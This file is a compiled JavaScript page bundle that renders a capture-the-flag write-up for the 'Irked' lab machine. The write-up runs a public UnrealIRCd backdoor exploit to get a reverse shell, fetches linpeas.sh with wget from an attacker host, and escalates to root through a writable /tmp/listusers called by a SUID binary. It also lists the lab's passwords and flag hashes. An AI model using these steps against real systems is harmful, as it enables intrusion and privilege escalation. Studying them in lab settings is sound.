(window.webpackJsonp=window.webpackJsonp||[]).push([[78],{419:function(e,s,t){"use strict";t.r(s);var a=t(13),r=Object(a.a)({},(function(){var e=this,s=e._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h1",{attrs:{id:"irked"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#irked"}},[e._v("#")]),e._v(" Irked")]),e._v(" "),s("p",[e._v("IP: "),s("code",[e._v("10.10.10.117")])]),e._v(" "),s("h2",{attrs:{id:"enum"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#enum"}},[e._v("#")]),e._v(" Enum")]),e._v(" "),s("p",[e._v("port 22: OpenSSH 6.7p1\nport 80: says IRC is almost working\nport 1111: rpcdbind")]),e._v(" "),s("p",[e._v("irc server: "),s("code",[e._v("irked.htb")])]),e._v(" "),s("p",[e._v("First, we add that to "),s("code",[e._v("/etc/host")]),e._v(" file.")]),e._v(" "),s("h2",{attrs:{id:"exploit"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#exploit"}},[e._v("#")]),e._v(" Exploit")]),e._v(" "),s("p",[e._v("Connect to the irc server:")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[e._v("nc")]),e._v(" irked.htb "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("65534")]),e._v("\n\nPASS admin\nNICK "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("test")]),e._v("\n"),s("span",{pre:!0,attrs:{class:"token environment constant"}},[e._v("USER")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("test")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("0")]),e._v(" * :test "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("test")]),e._v("\n")])])]),s("p",[e._v("and instantly the server tells us that it is running "),s("code",[e._v("Unreal3.2.8.1")])]),e._v(" "),s("p",[e._v("and a quick google search yields us with a "),s("a",{attrs:{href:"https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py",target:"_blank",rel:"noopener noreferrer"}},[e._v("exploit"),s("OutboundLink")],1)]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("python3 exploit.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-payload")]),e._v(" python "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".10.117 "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("8067")]),e._v("\n")])])]),s("p",[e._v("gives us back a reverse shell.")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("cd")]),e._v(" /tmp\n"),s("span",{pre:!0,attrs:{class:"token function"}},[e._v("wget")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".14.27/linpeas.sh\n")])])]),s("p",[s("code",[e._v("3.16.0-6-686-pae (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)")])]),e._v(" "),s("p",[e._v("Nothing works here.")]),e._v(" "),s("p",[e._v("Going into the user profile, we see that there's something called "),s("code",[e._v(".backup")]),e._v(" inside /home/djmardov/Documents.")]),e._v(" "),s("p",[e._v("Inside that file is called steg which stands for steganographic.")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[e._v("cat")]),e._v(" .backup\nSuper elite steg backup pw\nUPupDOWNdownLRlrBAbaSSss\n")])])]),s("p",[e._v("So now the pieces of the puzzle fall into place. Putting that image from port 80 into a steganographic decoder along with the password, we get the following test:")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("Kab6h+m+bbp2J:HG\n")])])]),s("p",[e._v("SSHing as "),s("code",[e._v("djmardov")]),e._v(" with the password above gives us a shell.")]),e._v(" "),s("p",[e._v("user.txt: "),s("code",[e._v("4a66a78b12dc0e661a59d3f5c0267a8e")])]),e._v(" "),s("h2",{attrs:{id:"priv-esc"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[e._v("#")]),e._v(" Priv esc")]),e._v(" "),s("p",[e._v("Now running "),s("code",[e._v("ls -lah usr/bin/")]),e._v(", we see that a program called viewuser in which we are allowed to run as root. Running it with "),s("code",[e._v("/usr/bin/viewuser")]),e._v(" says that the program "),s("code",[e._v("/tmp/listusers")]),e._v(" is missing.")]),e._v(" "),s("p",[e._v("So we just execute root with "),s("code",[e._v("/tmp/listusers")])]),e._v(" "),s("p",[e._v("So we do a simple "),s("code",[e._v('echo "su root" > /tmp/listusers && chmod +x /tmp/listusers')]),e._v(" to get a reverse shell")]),e._v(" "),s("p",[e._v("root.txt: "),s("code",[e._v("8d8e9e8be64654b6dccc3bff4522daf3")])])])}),[],!1,null,null,null);s.default=r.exports}}]);